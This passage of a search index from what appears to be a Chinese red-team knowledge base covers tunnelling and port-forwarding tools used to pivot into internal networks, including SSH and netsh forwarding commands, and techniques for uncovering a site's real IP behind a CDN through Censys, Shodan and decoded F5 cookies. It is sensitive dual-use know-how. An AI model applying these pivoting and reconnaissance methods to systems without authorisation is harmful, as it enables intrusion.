\u884c\uff0c\u6570\u636e\u5e93\u64cd\u4f5c\uff0c\u7cfb\u7edf\u4fe1\u606f\u6536\u96c6\u53ca\u7aef\u53e3\u626b\u63cf\u7b49\u529f\u80fd\uff09 \u4e0b\u8f7d\u5730\u5740: http://epinna.github.com/Weevely/ \u53c2\u8003\u94fe\u63a5: https://www.cnblogs.com/lingerhk/p/4009073.html ABPTTS Abptts\u662f\u4e00\u6b3e\u57fa\u4e8epython2.7\u7684http\u52a0\u5bc6\u96a7\u9053\u5de5\u5177\uff0cAbptts\u80fd\u505a\u7684\u5f88\u591a,\u7f3a\u70b9\u662f \u4e0d\u652f\u6301PHP \u901a\u8fc7http\u52a0\u5bc6\u96a7\u9053\u8f6c\u53d1\u81f3\u76ee\u6807\u5185\u7f51\u4e0b\u6307\u5b9a\u7684\u5355\u4e2aTCP\u7aef\u53e3 \u901a\u8fc7http\u52a0\u5bc6\u96a7\u9053\u540c\u65f6\u8f6c\u53d1\u81f3\u76ee\u6807\u5185\u7f51\u4e0b\u7684\u591a\u53f0\u673a\u5668\u4e0a\u7684\u591a\u4e2atcp\u7aef\u53e3 \u628assh\u96a7\u9053\u5305\u88f9\u5728http\u52a0\u5bc6\u96a7\u9053\u4e2d\u4f20\u9012\uff0c\u5bf9\u76ee\u6807\u4e8c\u7ea7\u5185\u7f51\u8fdb\u884c\u7a7f\u900f \u4e0b\u8f7d\u5730\u5740: https://github.com/nccgroup/ABPTTS.git \u53c2\u8003\u94fe\u63a5: https://blog.csdn.net/include_heqile/article/details/850 08629","title":"\u5173\u95ed\u672c\u5730\u7684ICMP\u5e94\u7b54"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#0x03","text":"\u7406\u8bba\u4e0a,\u4efb\u4f55\u63a5\u5165\u4e92\u8054\u7f51\u7684\u8ba1\u7b97\u673a\u90fd\u662f\u53ef\u8bbf\u95ee\u7684,\u4f46\u5982\u679c\u76ee\u6807\u4e3b\u673a \u5728\u5185\u7f51\u4e2d,\u6211\u4eec\u53c8\u60f3\u548c\u8be5\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\u7684\u8bdd,\u9664\u4e86\u505asocks\u4ee3\u7406\u548cht tp\u96a7\u9053\u5916,\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u7aef\u53e3\u8f6c\u53d1\u7684\u65b9\u6cd5\u6765\u4e0e\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\u3002 \u6587\u7ae0\u5f00\u59cb\u63d0\u5230\u7684\u56db\u79cd\u573a\u666f,\u524d\u4e09\u79cd\u573a\u666f\u90fd\u662f\u6709\u5e38\u7528\u7684\u7aef\u53e3\u8f6c\u53d1\u5de5\u5177 \u7684\u3002 1. Frp \u4e0b\u8f7d\u5730\u5740: https://github.com/fatedier/frp/releases \u53c2\u8003\u94fe\u63a5: http://www.secflag.com/archives/373.html 2. Msf+Portfwd \u53c2\u8003\u94fe\u63a5: https://blog.csdn.net/DarkHQ/article/details/80411158 3. Lcx lcx\u662f\u4e00\u6b3e\u5f3a\u5927\u7684\u5185\u7f51\u7aef\u53e3\u8f6c\u53d1\u5de5\u5177,\u5df2\u7ecf\u88ab\u6740\u6bd2\u8f6f\u4ef6\u5217\u4e3a\u6728\u9a6c,\u7528\u4e8e\u5c06\u5185\u7f51\u4e3b\u673a\u5f00 \u653e\u7684\u5185\u90e8\u7aef\u53e3\u6620\u5c04\u5230\u5916\u7f51\u4e3b\u673a(\u6709\u516c\u7f51IP)\u4efb\u610f\u7aef\u53e3. \u5b83\u662f\u4e00\u6b3e\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u5728\u6709\u6743\u9650\u7684webshell\u4e0b\u6267\u884c\uff0c\u6b63\u56e0\u5982\u6b64lcx\u5e38\u88ab \u8ba4\u4e3a\u662f\u4e00\u6b3e\u9ed1\u5ba2\u5165\u4fb5\u5de5\u5177\uff0clcx\u5728\u5185\u7f51\u5165\u4fb5\u6e17\u900f\u4e2d\u8d77\u7740\u91cd\u8981\u7684\u89d2\u8272\u3002lcx\u8fdb\u884c\u7aef\u53e3 \u8f6c\u53d1\u7684\u539f\u7406\u5c31\u662f\u4f7f\u4e0d\u540c\u7aef\u53e3\u4e4b\u95f4\u5f62\u6210\u4e00\u4e2a\u56de\u8def\u3002\u5b83\u5e38\u7528\u4e8e\u5916\u7f51\u8fde\u63a5\u5185\u7f513389\u7b49\u7aef\u53e3 \u3002 \u4e0b\u8f7d\u5730\u5740:\u81ea\u884c\u641c\u7d22\u5f15\u64ce \u53c2\u8003\u94fe\u63a5: https://blog.bbskali.cn/356.html 4. Socat \u4e0b\u8f7d\u5730\u5740: http://www.dest-unreach.org/socat/ \u53c2\u8003\u94fe\u63a5: https://www.cnblogs.com/iamlehaha/p/6540695.html 5. SSH","title":"0x03 \u7aef\u53e3\u8f6c\u53d1\u7bc7"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#_1","text":"ssh-CfNg-Lport1:127.0.0.1:port2user@host \u53c2\u6570\uff1a-L\u672c\u5730\u7f51\u5361\u5730\u5740:\u672c\u5730\u7aef\u53e3:\u76ee\u6807\u5730\u5740:\u76ee\u6807\u7aef\u53e3","title":"\u672c\u5730\u7aef\u53e3\u8f6c\u53d1:"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#_2","text":"ssh-CfNg-Rport2:127.0.0.1:port1user@hsst \u53c2\u6570\uff1a-R\u8fdc\u7a0b\u7f51\u5361\u5730\u5740:\u8fdc\u7a0b\u7aef\u53e3:\u76ee\u6807\u5730\u5740:\u76ee\u6807\u7aef\u53e3","title":"\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1\uff1a"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#_3","text":"ssh-Dlocalhost:2000root@103.59.22.17 \u53c2\u6570\uff1a-D\u672c\u5730\u7f51\u5361\u5730\u5740:\u672c\u5730\u7aef\u53e3 6. Netsh netsh\u662fwindows\u4e0b\u63d0\u4f9b\u7f51\u7edc\u7ba1\u7406\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u662f\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684shell,\u6d89\u53ca\u5230 \u4e0a\u4e0b\u6587\u7684\u6982\u5ff5\u3002\u6211\u4eec\u5728\u4ea4\u4e92\u5f0f\u4e0b\u9762\u8fdb\u5165\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c\u8fdb\u884c\u53c2\u6570\u7684\u8bbe\u7f6e\u3002\u4e5f\u53ef\u4ee5\u76f4 \u63a5\u4e0b\u9762\u8fd9\u6837\u975e\u4ea4\u4e92\u5f0f\u7684\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1\u3002 `netshinterfaceipv6install","title":"\u52a8\u6001\u7aef\u53e3\u8f6c\u53d1"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#_4","text":"netshinterfaceportproxyaddv4tov4listenaddress=10.10.18.1listenpo rt=4455connectaddress=10.10.12.1connectport=8080","title":"\u8f6c\u53d1"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#_5","text":"netshinterfaceportproxydeletev4tov4listenaddress={B\u7684IP}listenpo rt={B\u7684\u7aef\u53e3}","title":"\u5220\u9664\u8f6c\u53d1"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#0x04-socks","text":"\u5728\u505a\u597dsocks\u4ee3\u7406\u4ee5\u540e,\u6211\u4eec\u9700\u8981\u4f7f\u7528socks\u5ba2\u6237\u7aef\u6302\u4e0a\u4ee3\u7406,\u624d\u80fd \u8bbf \u95ee \u76ee \u6807 \u73af \u5883 , \u5728 \u8fd9 \u91cc \u8bf4 \u4e00 \u4e0b \u4e2a \u4eba \u7684 \u914d \u7f6e , \u5c0f\u7f16\u5de5\u4f5c\u673a\u4e3amac,socks\u4ee3\u7406\u5ba2\u6237\u7aef\u56fe\u5f62\u5316\u5de5\u5177\u4f7f\u7528proxifier,\u547d\u4ee4\u884c \u5de5\u5177\u4f7f\u7528proxychains4,\u53e6\u5916\u6211\u6bd4\u8f83\u559c\u6b22\u5355\u72ec\u914d\u7f6e,burpsuite\u8d70\u4ee3\u7406 \u5c31\u5728burpsuite\u914d\u7f6e,\u7ec8\u7aef\u8d70\u4ee3\u7406\u5c31\u5728\u7ec8\u7aef\u914d\u7f6e\u4ee3\u7406,\u6d4f\u89c8\u5668\u9700\u8981\u8d70\u4ee3\u7406 \u5c31\u5728\u6d4f\u89c8\u5668\u914d\u7f6e\u4ee3\u7406\u3002 1.proxychains \u9700\u8981\u4fee\u6539mac\u7684\u914d\u7f6e \u4fee\u6539\u914d\u7f6e\u53c2\u8003\u94fe\u63a5: https://zhuanlan.zhihu.com/p/21281236 \u4f7f\u7528\u65b9\u6cd5\u53c2\u8003\u94fe\u63a5: https://www.cnblogs.com/wyet/p/7868395.html 2.proxifier \u8fd9\u4e2a\u5de5\u5177\u597d\u7528,\u8de8\u5e73\u53f0\u4f7f\u7528 \u53c2\u8003\u94fe\u63a5: http://www.hopol.cn/2018/05/1142/ 3 burpsuite \u6302socks\u4ee3\u7406 \u53c2\u8003\u94fe\u63a5: https://www.cnblogs.com/hookjoy/p/10759555.html 4 chrome \u6302socks\u4ee3\u7406 \u63d2\u4ef6:SwitchyOmega 5 \u7ec8\u7aef\u8d70\u4ee3\u7406 \u6302\u4ee3\u7406\u547d\u4ee4alias proxy='export all_proxy=socks5://127.0.0.1:1086 \u53d6\u6d88\u4ee3\u7406\u547d\u4ee4alias unproxy='unset all_pro","title":"0x04 socks\u4ee3\u7406\u5ba2\u6237\u7aef"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","text":"\u4fe1\u606f\u6536\u96c6 \u00b6 whois\u67e5\u8be2 \u6536\u96c6\u5b50\u57df\u540d \u7aef\u53e3\u626b\u63cf \u67e5\u627e\u771f\u5b9eip \u63a2\u6d4b\u65c1\u7ad9\u53caC\u6bb5 \u7f51\u7edc\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce \u626b\u63cf\u654f\u611f\u76ee\u5f55/\u6587\u4ef6 \u6307\u7eb9\u8bc6\u522b \u975e\u5e38\u89c4\u64cd\u4f5c \u00b6 SSL/TLS\u8bc1\u4e66\u67e5\u8be2 \u00b6 \u00b6 \u67e5\u627e\u771f\u5b9eIP \u00b6 \u7ed5\u8fc7CDN\u7684\u591a\u79cd\u65b9\u6cd5\u5177\u4f53\u53ef\u4ee5\u53c2\u8003 https://www.cnblogs.com/qiudabai/p/9763739.html 0x01 \u9a8c\u8bc1\u662f\u5426\u5b58\u5728CDN \u00b6 \u65b9\u6cd51\uff1a\u5404\u79cd\u591a\u5730 ping \u7684\u670d\u52a1\uff0c\u67e5\u770b\u5bf9\u5e94 IP \u5730\u5740\u662f\u5426\u552f\u4e00 \u65b9\u6cd52\uff1a\u4f7f\u7528 nslookup \u8fdb\u884c\u68c0\u6d4b\uff0c\u539f\u7406\u540c\u4e0a\uff0c\u5982\u679c\u8fd4\u56de\u57df\u540d\u89e3\u6790\u5bf9\u5e94\u591a\u4e2a IP \u5730\u5740\u591a\u534a\u662f\u4f7f\u7528\u4e86 CDN 0x02 \u7ed5\u8fc7 CDN \u67e5\u627e\u7f51\u7ad9\u771f\u5b9e IP \u00b6 \u65b9\u6cd51:\u67e5\u8be2\u5386\u53f2DNS\u8bb0\u5f55 \u65b9\u6cd52:\u67e5\u8be2\u5b50\u57df\u540d \u5fae\u6b65\u5728\u7ebf Dnsdb\u67e5\u8be2\u6cd5 Google \u641c\u7d22 \u5404\u79cd\u5b50\u57df\u540d\u626b\u63cf\u5668 \u65b9\u6cd53\uff1a\u7f51\u7edc\u7a7a\u95f4\u5f15\u64ce\u641c\u7d22\u6cd5 \u5e38\u89c1\u7684\u6709\u4ee5\u524d\u7684\u949f\u9997\u4e4b\u773c\uff0c shodan \uff0c fofa\u641c\u7d22 \u3002\u4ee5fofa\u4e3a\u4f8b\uff0c\u53ea\u9700\u8f93\u5165\uff1atitle:\u201c\u7f51\u7ad9\u7684title\u5173\u952e\u5b57\u201d\u6216\u8005body\uff1a\u201c\u7f51\u7ad9\u7684body\u7279\u5f81\u201d\u5c31\u53ef\u4ee5\u627e\u51fafofa\u6536\u5f55\u7684\u6709\u8fd9\u4e9b\u5173\u952e\u5b57\u7684ip\u57df\u540d\uff0c\u5f88\u591a\u65f6\u5019\u80fd\u83b7\u53d6\u7f51\u7ad9\u7684\u771f\u5b9eip\uff0c\u5982\u56fe\uff1a \u65b9\u6cd54:\u5229\u7528SSL\u8bc1\u4e66\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u4f7f\u7528\u7ed9\u5b9a\u7684\u57df\u540d \u5047\u5982\u4f60\u5728xyz123boot.com\u4e0a\u6258\u7ba1\u4e86\u4e00\u4e2a\u670d\u52a1\uff0c\u539f\u59cb\u670d\u52a1\u5668IP\u662f136.23.63.44\u3002 \u800cCloudFlare\u5219\u4f1a\u4e3a\u4f60\u63d0\u4f9bDDoS\u4fdd\u62a4\uff0cWeb\u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\u548c\u5176\u4ed6\u4e00\u4e9b\u5b89\u5168\u670d\u52a1\uff0c\u4ee5\u4fdd\u62a4\u4f60\u7684\u670d\u52a1\u514d\u53d7\u653b\u51fb\u3002\u4e3a\u6b64\uff0c\u4f60\u7684Web\u670d\u52a1\u5668\u5c31\u5fc5\u987b\u652f\u6301SSL\u5e76\u5177\u6709\u8bc1\u4e66\uff0c\u6b64\u65f6CloudFlare\u4e0e\u4f60\u7684\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u5c31\u50cf\u4f60\u548cCloudFlare\u4e4b\u95f4\u7684\u901a\u4fe1\u4e00\u6837\uff0c\u4f1a\u88ab\u52a0\u5bc6\uff08\u5373\u6ca1\u6709\u7075\u6d3b\u7684SSL\u5b58\u5728\uff09\u3002\u8fd9\u770b\u8d77\u6765\u5f88\u5b89\u5168\uff0c\u4f46\u95ee\u9898\u662f\uff0c\u5f53\u4f60\u5728\u7aef\u53e3443\uff08 https://136.23.63.44:443\uff09\u4e0a\u76f4\u63a5\u8fde\u63a5\u5230IP\u65f6\uff0cSSL\u8bc1\u4e66\u5c31\u4f1a\u88ab\u66b4\u9732\u3002 \u6b64\u65f6\uff0c\u5982\u679c\u653b\u51fb\u8005\u626b\u63cf0.0.0.0/0\uff0c\u5373\u6574\u4e2a\u4e92\u8054\u7f51\uff0c\u4ed6\u4eec\u5c31\u53ef\u4ee5\u5728\u7aef\u53e3443\u4e0a\u83b7\u53d6\u5728xyz123boot.com\u4e0a\u7684\u6709\u6548\u8bc1\u4e66\uff0c\u8fdb\u800c\u83b7\u53d6\u63d0\u4f9b\u7ed9\u4f60\u7684Web\u670d\u52a1\u5668IP\u3002 \u76ee\u524dCensys\u5de5\u5177\u5c31\u80fd\u5b9e\u73b0\u5bf9\u6574\u4e2a\u4e92\u8054\u7f51\u7684\u626b\u63cf\uff0cCensys\u662f\u4e00\u6b3e\u7528\u4ee5\u641c\u7d22\u8054\u7f51\u8bbe\u5907\u4fe1\u606f\u7684\u65b0\u578b\u641c\u7d22\u5f15\u64ce\uff0c\u5b89\u5168\u4e13\u5bb6\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u8bc4\u4f30\u4ed6\u4eec\u5b9e\u73b0\u65b9\u6848\u7684\u5b89\u5168\u6027\uff0c\u800c\u9ed1\u5ba2\u5219\u53ef\u4ee5\u4f7f\u7528\u5b83\u4f5c\u4e3a\u524d\u671f\u4fa6\u67e5\u653b\u51fb\u76ee\u6807\u3001\u6536\u96c6\u76ee\u6807\u4fe1\u606f\u7684\u5f3a\u5927\u5229\u5668\u3002Censys\u641c\u7d22\u5f15\u64ce\u80fd\u591f\u626b\u63cf\u6574\u4e2a\u4e92\u8054\u7f51\uff0cCensys\u6bcf\u5929\u90fd\u4f1a\u626b\u63cfIPv4\u5730\u5740\u7a7a\u95f4\uff0c\u4ee5\u641c\u7d22\u6240\u6709\u8054\u7f51\u8bbe\u5907\u5e76\u6536\u96c6\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u5e76\u8fd4\u56de\u4e00\u4efd\u6709\u5173\u8d44\u6e90\uff08\u5982\u8bbe\u5907\u3001\u7f51\u7ad9\u548c\u8bc1\u4e66\uff09\u914d\u7f6e\u548c\u90e8\u7f72\u4fe1\u606f\u7684\u603b\u4f53\u62a5\u544a\u3002 \u800c\u653b\u51fb\u8005\u552f\u4e00\u9700\u8981\u505a\u7684\u5c31\u662f\u628a\u4e0a\u9762\u7528\u6587\u5b57\u63cf\u8ff0\u7684\u641c\u7d22\u8bcd\u7ffb\u8bd1\u6210\u5b9e\u9645\u7684\u641c\u7d22\u67e5\u8be2\u53c2\u6570\u3002 xyz123boot.com\u8bc1\u4e66\u7684\u641c\u7d22\u67e5\u8be2\u53c2\u6570\u4e3a\uff1aparsed.names\uff1axyz123boot.com \u53ea\u663e\u793a\u6709\u6548\u8bc1\u4e66\u7684\u67e5\u8be2\u53c2\u6570\u4e3a\uff1atags.raw\uff1atrusted \u653b\u51fb\u8005\u53ef\u4ee5\u5728Censys\u4e0a\u5b9e\u73b0\u591a\u4e2a\u53c2\u6570\u7684\u7ec4\u5408\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u7b80\u5355\u7684\u5e03\u5c14\u903b\u8f91\u6765\u5b8c\u6210\u3002 \u7ec4\u5408\u540e\u7684\u641c\u7d22\u53c2\u6570\u4e3a\uff1aparsed.names: xyz123boot.com and tags.raw: trusted Censys\u5c06\u5411\u4f60\u663e\u793a\u7b26\u5408\u4e0a\u8ff0\u641c\u7d22\u6761\u4ef6\u7684\u6240\u6709\u6807\u51c6\u8bc1\u4e66\uff0c\u4ee5\u4e0a\u8fd9\u4e9b\u8bc1\u4e66\u662f\u5728\u626b\u63cf\u4e2d\u627e\u5230\u7684\u3002 \u8981\u9010\u4e2a\u67e5\u770b\u8fd9\u4e9b\u641c\u7d22\u7ed3\u679c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5355\u51fb\u53f3\u4fa7\u7684\u201cExplore\u201d\uff0c\u6253\u5f00\u5305\u542b\u591a\u4e2a\u5de5\u5177\u7684\u4e0b\u62c9\u83dc\u5355\u3002What's using this certificate? > IPv4 Hosts \u6b64\u65f6\uff0c\u653b\u51fb\u8005\u5c06\u770b\u5230\u4e00\u4e2a\u4f7f\u7528\u7279\u5b9a\u8bc1\u4e66\u7684IPv4\u4e3b\u673a\u5217\u8868\uff0c\u800c\u771f\u5b9e\u539f\u59cb IP\u5c31\u85cf\u5728\u5176\u4e2d\u3002 \u4f60\u53ef\u4ee5\u901a\u8fc7\u5bfc\u822a\u5230\u7aef\u53e3443\u4e0a\u7684IP\u6765\u9a8c\u8bc1\uff0c\u770b\u5b83\u662f\u5426\u91cd\u5b9a\u5411\u5230xyz123boot.com\uff1f\u6216\u5b83\u662f\u5426\u76f4\u63a5\u5728IP\u4e0a\u663e\u793a\u7f51\u7ad9\uff1f \u4f7f\u7528\u7ed9\u5b9a\u7684SSL\u8bc1\u4e66 \u5982\u679c\u4f60\u662f\u6267\u6cd5\u90e8\u95e8\u7684\u4eba\u5458\uff0c\u60f3\u8981\u627e\u51fa\u4e00\u4e2a\u9690\u85cf\u5728cheesecp5vaogohv.onion\u4e0b\u7684\u513f\u7ae5\u8272\u60c5\u7f51\u7ad9\u3002\u505a\u597d\u7684\u529e\u6cd5\uff0c\u5c31\u662f\u627e\u5230\u5176\u539f\u59cbIP\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u8ffd\u8e2a\u5230\u5176\u6258\u7ba1\u7684\u670d\u52a1\u5668\uff0c\u751a\u81f3\u67e5\u5230\u80cc\u540e\u7684\u8fd0\u8425\u5546\u4ee5\u53ca\u91d1\u878d\u7ebf\u7d22\u3002 \u9690\u85cf\u670d\u52a1\u5177\u6709SSL\u8bc1\u4e66\uff0c\u8981\u67e5\u627e\u5b83\u4f7f\u7528\u7684IPv4\u4e3b\u673a\uff0c\u53ea\u9700\u5c06\"SHA1 fingerprint\"\uff08\u7b7e\u540d\u8bc1\u4e66\u7684sha1\u503c\uff09\u7c98\u8d34\u5230Censys IPv4\u4e3b\u673a\u641c\u7d22\u4e2d\uff0c\u5373\u53ef\u627e\u5230\u8bc1\u4e66\uff0c\u4f7f\u7528\u6b64\u65b9\u6cd5\u53ef\u4ee5\u8f7b\u677e\u627e\u5230\u914d\u7f6e\u9519\u8bef\u7684Web\u670d\u52a1\u5668\u3002 \u65b9\u6cd55:\u5229\u7528HTTP\u6807\u5934\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u501f\u52a9SecurityTrails\u8fd9\u6837\u7684\u5e73\u53f0\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u5728\u832b\u832b\u7684\u5927\u6570\u636e\u641c\u7d22\u5230\u81ea\u5df1\u7684\u76ee\u6807\uff0c\u751a\u81f3\u53ef\u4ee5\u901a\u8fc7\u6bd4\u8f83HTTP\u6807\u5934\u6765\u67e5\u627e\u5230\u539f\u59cb\u670d\u52a1\u5668\u3002 \u7279\u522b\u662f\u5f53\u7528\u6237\u62e5\u6709\u4e00\u4e2a\u975e\u5e38\u7279\u522b\u7684\u670d\u52a1\u5668\u540d\u79f0\u4e0e\u8f6f\u4ef6\u540d\u79f0\u65f6\uff0c\u653b\u51fb\u8005\u627e\u5230\u4f60\u5c31\u53d8\u5f97\u66f4\u5bb9\u6613\u3002 \u5982\u679c\u8981\u641c\u7d22\u7684\u6570\u636e\u76f8\u5f53\u591a\uff0c\u5982\u4e0a\u6240\u8ff0\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728Censys\u4e0a\u7ec4\u5408\u641c\u7d22\u53c2\u6570\u3002\u5047\u8bbe\u4f60\u6b63\u5728\u4e0e1500\u4e2aWeb\u670d\u52a1\u5668\u5171\u4eab\u4f60\u7684\u670d\u52a1\u5668HTTP\u6807\u5934\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u90fd\u53d1\u9001\u7684\u662f\u76f8\u540c\u7684\u6807\u5934\u53c2\u6570\u548c\u503c\u7684\u7ec4\u5408\u3002\u800c\u4e14\u4f60\u8fd8\u4f7f\u7528\u65b0\u7684PHP\u6846\u67b6\u53d1\u9001\u552f\u4e00\u7684HTTP\u6807\u5934\uff08\u4f8b\u5982\uff1aX-Generated-Via\uff1aXYZ\u6846\u67b6\uff09\uff0c\u76ee\u524d\u7ea6\u6709400\u540d\u7f51\u7ad9\u7ba1\u7406\u5458\u4f7f\u7528\u4e86\u8be5\u6846\u67b6\u3002\u800c\u6700\u7ec8\u7531\u4e09\u4e2a\u670d\u52a1\u5668\u7ec4\u6210\u7684\u4ea4\u96c6\uff0c\u53ea\u9700\u624b\u52a8\u64cd\u4f5c\u5c31\u53ef\u4ee5\u627e\u5230\u4e86IP\uff0c\u6574\u4e2a\u8fc7\u7a0b\u53ea\u9700\u8981\u51e0\u79d2\u949f\u3002 \u4f8b\u5982\uff0cCensys\u4e0a\u7528\u4e8e\u5339\u914d\u670d\u52a1\u5668\u6807\u5934\u7684\u641c\u7d22\u53c2\u6570\u662f80.http.get.headers.server :\uff0c\u67e5\u627e\u7531CloudFlare\u63d0\u4f9b\u670d\u52a1\u7684\u7f51\u7ad9\u7684\u53c2\u6570\u5982\u4e0b\uff1a 80.http.get.headers.server:cloudflare \u65b9\u6cd56:\u5229\u7528\u7f51\u7ad9\u8fd4\u56de\u7684\u5185\u5bb9\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u5982\u679c\u539f\u59cb\u670d\u52a1\u5668IP\u4e5f\u8fd4\u56de\u4e86\u7f51\u7ad9\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u7f51\u4e0a\u641c\u7d22\u5927\u91cf\u7684\u76f8\u5173\u6570\u636e\u3002 \u6d4f\u89c8\u7f51\u7ad9\u6e90\u4ee3\u7801\uff0c\u5bfb\u627e\u72ec\u7279\u7684\u4ee3\u7801\u7247\u6bb5\u3002\u5728JavaScript\u4e2d\u4f7f\u7528\u5177\u6709\u8bbf\u95ee\u6216\u6807\u8bc6\u7b26\u53c2\u6570\u7684\u7b2c\u4e09\u65b9\u670d\u52a1\uff08\u4f8b\u5982Google Analytics\uff0creCAPTCHA\uff09\u662f\u653b\u51fb\u8005\u7ecf\u5e38\u4f7f\u7528\u7684\u65b9\u6cd5\u3002 \u4ee5\u4e0b\u662f\u4eceHackTheBox\u7f51\u7ad9\u83b7\u53d6\u7684Google Analytics\u8ddf\u8e2a\u4ee3\u7801\u793a\u4f8b\uff1a ga\uff08'create'\uff0c'UA-93577176-1'\uff0c'auto'\uff09; \u53ef\u4ee5\u4f7f\u752880.http.get.body\uff1a\u53c2\u6570\u901a\u8fc7body/source\u8fc7\u6ee4Censys\u6570\u636e\uff0c\u4e0d\u5e78\u7684\u662f\uff0c\u6b63\u5e38\u7684\u641c\u7d22\u5b57\u6bb5\u6709\u5c40\u9650\u6027\uff0c\u4f46\u4f60\u53ef\u4ee5\u5728Censys\u8bf7\u6c42\u7814\u7a76\u8bbf\u95ee\u6743\u9650\uff0c\u8be5\u6743\u9650\u5141\u8bb8\u4f60\u901a\u8fc7Google BigQuery\u8fdb\u884c\u66f4\u5f3a\u5927\u7684\u67e5\u8be2\u3002 Shodan\u662f\u4e00\u79cd\u7c7b\u4f3c\u4e8eCensys\u7684\u670d\u52a1\uff0c\u4e5f\u63d0\u4f9b\u4e86http.html\u641c\u7d22\u53c2\u6570\u3002 \u641c\u7d22\u793a\u4f8b\uff1a https://www.shodan.io/search?query=http.html%3AUA-32023260-1 \u65b9\u6cd57:\u4f7f\u7528\u56fd\u5916\u4e3b\u673a\u89e3\u6790\u57df\u540d \u65b9\u6cd58:\u7f51\u7ad9\u6f0f\u6d1e\u67e5\u627e 1\uff09\u76ee\u6807\u654f\u611f\u6587\u4ef6\u6cc4\u9732\uff0c\u4f8b\u5982\uff1a.git\u6587\u4ef6\u6cc4\u9732\uff0c.svn\u6587\u4ef6\u6cc4\u9732\uff0cphpinfo\u4e4b\u7c7b\u7684\u63a2\u9488\u3001GitHub\u4fe1\u606f\u6cc4\u9732\u7b49\u3002 2\uff09XSS\u76f2\u6253\uff0c\u547d\u4ee4\u6267\u884c\u53cd\u5f39shell\uff0cSSRF\u7b49\u3002 3\uff09\u65e0\u8bba\u662f\u7528\u793e\u5de5\u8fd8\u662f\u5176\u4ed6\u624b\u6bb5\uff0c\u62ff\u5230\u4e86\u76ee\u6807\u7f51\u7ad9\u7ba1\u7406\u5458\u5728CDN\u7684\u8d26\u53f7\uff0c\u4ece\u800c\u5728\u4eceCDN\u7684\u914d\u7f6e\u4e2d\u627e\u5230\u7f51\u7ad9\u7684\u771f\u5b9eIP\u3002 \u65b9\u6cd59:\u7f51\u7ad9\u90ae\u4ef6\u8ba2\u9605\u67e5\u627e \u65b9\u6cd510\uff1a\u7528 Zmap \u626b\u5168\u7f51 \u9700\u8981\u627e xiaix.me \u7f51\u7ad9\u7684\u771f\u5b9e IP\uff0c\u6211\u4eec\u9996\u5148\u4ece apnic \u83b7\u53d6 IP \u6bb5\uff0c\u7136\u540e\u4f7f\u7528 Zmap \u7684 banner-grab \u626b\u63cf\u51fa\u6765 80 \u7aef\u53e3\u5f00\u653e\u7684\u4e3b\u673a\u8fdb\u884c banner \u6293\u53d6\uff0c\u6700\u540e\u5728 http-req \u4e2d\u7684 Host \u5199 xiaix.me \u65b9\u6cd511\uff1aF5 LTM\u89e3\u7801\u6cd5 \u5f53\u670d\u52a1\u5668\u4f7f\u7528F5 LTM\u505a\u8d1f\u8f7d\u5747\u8861\u65f6\uff0c\u901a\u8fc7\u5bf9set-cookie\u5173\u952e\u5b57\u7684\u89e3\u7801\u771f\u5b9eip\u4e5f\u53ef\u88ab\u83b7\u53d6\uff0c\u4f8b\u5982\uff1aSet-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000\uff0c\u5148\u628a\u7b2c\u4e00\u5c0f\u8282\u7684\u5341\u8fdb\u5236\u6570\u5373487098378\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5c06\u5176\u8f6c\u4e3a\u5341\u516d\u8fdb\u5236\u65701d08880a\uff0c\u63a5\u7740\u4ece\u540e\u81f3\u524d\uff0c\u4ee5\u6b64\u53d6\u56db\u4f4d\u6570\u51fa\u6765\uff0c\u4e5f\u5c31\u662f0a.88.08.1d\uff0c\u6700\u540e\u4f9d\u6b21\u628a\u4ed6\u4eec\u8f6c\u4e3a\u5341\u8fdb\u5236\u657010.136.8.29\uff0c\u4e5f\u5c31\u662f\u6700\u540e\u7684\u771f\u5b9eip 0 x 0 5 \u65c1 \u7ad9 